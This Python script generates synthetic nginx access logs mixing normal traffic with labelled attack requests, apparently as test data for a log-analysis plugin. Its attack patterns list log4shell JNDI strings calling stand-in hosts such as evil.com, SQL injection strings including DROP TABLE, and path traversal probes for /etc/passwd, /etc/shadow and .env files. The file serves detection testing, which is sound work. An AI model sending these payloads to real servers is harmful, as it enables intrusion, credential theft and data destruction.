import random
from datetime import datetime, timedelta
import ipaddress
import uuid
import pandas as pd
import hashlib

def generate_nginx_logs(num_lines=500000, start_date=datetime(2024, 11, 1)):
    # Define some constants
    ATTACK_PERCENTAGE = 0.15  # 15% of traffic will be attacks
    NOISE_IN_ATTACKS = 0.20   # 20% of attackers will also make normal requests

    # Normal paths
    normal_paths = [
        '/api/users',
        '/api/products',
        '/static/main.css',
        '/images/logo.png',
        '/favicon.ico',
        '/about',
        '/contact'
    ]

    # Attack patterns with associated user agents and IPs
    attack_patterns = [
        {
            'name': 'log4shell',
            'user_agents': [
                'Go-http-client/1.1',
                'Python-urllib/3.9',
                'python-requests/2.27.1'
            ],
            'paths': [
                '/api/${jndi:ldap://malicious.com/payload}',
                '/?x=${jndi:ldap://evil.com/a}',
                '/hello?param=${jndi:ldap://attacker.com/exploit}',
                '/test?q=${jndi:ldap://bad.com/x}',
                '/api/v1?param=${jndi:ldap://hack.com/y}',
                '/index?id=${jndi:ldap://mal.com/z}'
            ],
            'methods': ['GET', 'POST'],
            'ip_ranges': [('193.27.228.0', '193.27.228.255')],
            'status_codes': [404, 400, 500]
        },
        {
            'name': 'sql_injection',
            'user_agents': [
                'sqlmap/1.6.12#dev (http://sqlmap.org)',
                'python-requests/2.31.0',
                'Mozilla/5.0 (compatible; SQLMapProbe/1.0)'
            ],
            'paths': [
                "/login?id=1' OR '1'='1",
                "/users/1' UNION SELECT * FROM users--",
                "/products?category=1' OR TRUE;--",
                "/search?q=1'; DROP TABLE users--",
                "/api/user?id=1' OR 1=1--",
                "/app/login?user=admin'--",
                "/data?filter='OR'1'='1",
                "/query?id=1';SELECT/**/1,2,3--"
            ],
            'methods': ['GET', 'POST'],
            'ip_ranges': [('45.155.205.0', '45.155.205.255')],
            'status_codes': [200, 403, 500]
        },
        {
            'name': 'path_traversal',
            'user_agents': [
                'DirBuster-1.0-RC1',
                'Nikto/2.1.6',
                'dirsearch/0.4.2'
            ],
            'paths': [
                '/../../../etc/passwd',
                '/.git/config',
                '/wp-config.php.bak',
                '/../../.env',
                '/.svn/entries',
                '/../../etc/shadow',
                '/../private/keys.txt',
                '/app/../../config/database.yml',
                '/images/../../../../etc/hosts'
            ],
            'methods': ['GET'],
            'ip_ranges': [('185.181.0.0', '185.181.255.255')],
            'status_codes': [403, 404]
        }
    ]

    # Legitimate user agents
    normal_user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]

    logs = []
    current_time = start_date

    # Generate attack sequences first
    attack_logs = []
    attack_count = int(num_lines * ATTACK_PERCENTAGE)

    for _ in range(attack_count):
        # Pick an attack pattern
        attack = random.choice(attack_patterns)

        # Generate attacker IP
        ip_range = random.choice(attack.get('ip_ranges'))
        attacker_ip = str(ipaddress.IPv4Address(random.randint(
            int(ipaddress.IPv4Address(ip_range[0])),
            int(ipaddress.IPv4Address(ip_range[1]))
        )))

        # Create sequence of related attacks
        sequence_length = min(random.randint(3, 8), len(attack['paths']))

        # Sometimes attackers make normal requests too
        if random.random() < NOISE_IN_ATTACKS:
            sequence = (random.sample(attack['paths'], sequence_length - 1) + 
                      [random.choice(normal_paths)])
        else:
            # Ensure we don't try to sample more paths than available
            sequence = random.sample(attack['paths'], sequence_length)

        user_agent = random.choice(attack['user_agents'])

        for path in sequence:
            method = random.choice(attack['methods'])
            status = random.choice(attack['status_codes'])

            timestamp = current_time + timedelta(seconds=random.uniform(0, 2))

            # Generate unique ID
            unique_str = f"{timestamp}{attacker_ip}{path}"
            tp_id = "csv" + hashlib.md5(unique_str.encode()).hexdigest()[:17]

            log_entry = {
                'tp_id': tp_id,
                'tp_source_type': 'file_system',
                'tp_ingest_timestamp': datetime(2024, 11, 21, 21, 32, 41, 705346),
                'tp_timestamp': timestamp,
                'tp_source_ip': attacker_ip,
                'tp_destination_ip': None,
                'tp_source_name': None,
                'tp_source_location': '/home/jon/tpsrc/tailpipe-plugin-nginx/tests/dev1.log',
                'tp_akas': [path],
                'tp_ips': [attacker_ip],
                'tp_tags': [f"method:{method}", f"attack:{attack['name']}"],
                'tp_domains': [],
                'tp_emails': [],
                'tp_usernames': [],
                'remote_addr': attacker_ip,
                'remote_user': '-',
                'time_local': timestamp.strftime('%d/%b/%Y:%H:%M:%S +0000'),
                'time_iso_8601': timestamp.strftime('%Y-%m-%dT%H:%M:%SZ'),
                'request': f"{method} {path} HTTP/1.1",
                'method': method,
                'path': path,
                'http_version': '1.1',
                'status': status,
                'body_bytes_sent': random.randint(200, 1500),
                'http_referer': '-',
                'http_user_agent': user_agent,
                'timestamp': timestamp,
                'tp_date': timestamp.date(),
                'tp_index': 'dev1.log',
                'tp_partition': 'dev'
            }
            attack_logs.append(log_entry)
            current_time = timestamp

    # Generate normal traffic
    normal_count = num_lines - len(attack_logs)
    for _ in range(normal_count):
        client_ip = str(ipaddress.IPv4Address(random.randint(0, 2**32 - 1)))
        path = random.choice(normal_paths)
        method = random.choice(['GET', 'GET', 'GET', 'POST'])  # Weight towards GET
        status = random.choice([200, 200, 200, 200, 301, 404])  # Weight towards 200

        timestamp = current_time + timedelta(seconds=random.uniform(0, 2))

        # Generate unique ID
        unique_str = f"{timestamp}{client_ip}{path}"
        tp_id = "csv" + hashlib.md5(unique_str.encode()).hexdigest()[:17]

        log_entry = {
            'tp_id': tp_id,
            'tp_source_type': 'file_system',
            'tp_ingest_timestamp': datetime(2024, 11, 21, 21, 32, 41, 705346),
            'tp_timestamp': timestamp,
            'tp_source_ip': client_ip,
            'tp_destination_ip': None,
            'tp_source_name': None,
            'tp_source_location': '/home/jon/tpsrc/tailpipe-plugin-nginx/tests/dev1.log',
            'tp_akas': [path],
            'tp_ips': [client_ip],
            'tp_tags': [f"method:{method}"],
            'tp_domains': [],
            'tp_emails': [],
            'tp_usernames': [],
            'remote_addr': client_ip,
            'remote_user': '-',
            'time_local': timestamp.strftime('%d/%b/%Y:%H:%M:%S +0000'),
            'time_iso_8601': timestamp.strftime('%Y-%m-%dT%H:%M:%SZ'),
            'request': f"{method} {path} HTTP/1.1",
            'method': method,
            'path': path,
            'http_version': '1.1',
            'status': status,
            'body_bytes_sent': random.randint(500, 15000),
            'http_referer': '-',
            'http_user_agent': random.choice(normal_user_agents),
            'timestamp': timestamp,
            'tp_date': timestamp.date(),
            'tp_index': 'dev1.log',
            'tp_partition': 'dev'
        }
        logs.append(log_entry)
        current_time = timestamp

    
    # Combine and sort all logs
    all_logs = attack_logs + logs
    all_logs.sort(key=lambda x: x['timestamp'])

    # Convert to DataFrame and save
    df = pd.DataFrame(all_logs)
    df.to_parquet('nginx_access_log.parquet', index=False)
    print(f"Generated {len(all_logs)} records and saved to nginx_access_log.parquet")

if __name__ == "__main__":
    generate_nginx_logs()
